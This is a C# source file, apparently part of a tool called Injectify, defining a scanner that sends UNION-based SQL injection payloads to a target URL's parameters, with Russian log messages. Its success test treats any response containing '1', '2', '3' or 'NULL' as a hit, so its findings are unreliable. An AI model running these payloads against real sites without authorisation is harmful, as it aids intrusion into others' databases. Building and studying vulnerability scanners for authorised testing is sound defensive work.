using Injectify.Core;

namespace Injectify.Modules
{
    public class UnionBasedScanner : InjectifyScanner
    {
        private readonly List<string> _payloads = new()
        {
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT 1,2,3--"
        };

        public UnionBasedScanner(string targetUrl) : base(targetUrl) { }

        public override async Task<bool> IsVulnerableAsync()
        {
            Log("Начинаю тестирование UNION-based...");

            return await TestParametersAsync(_payloads, async (url, key, payload) =>
            {
                var response = await SendRequestAsync("GET", url);
                if (IsUnionSuccess(response))
                {
                    Log($"[UNION] Уязвимость! Параметр: {key}, Payload: {payload}");
                    return true;
                }
                return false;
            });
        }

        private bool IsUnionSuccess(string content)
        {
            return content.Contains("1") || content.Contains("NULL") || content.Contains("2") || content.Contains("3");
        }
    }
}
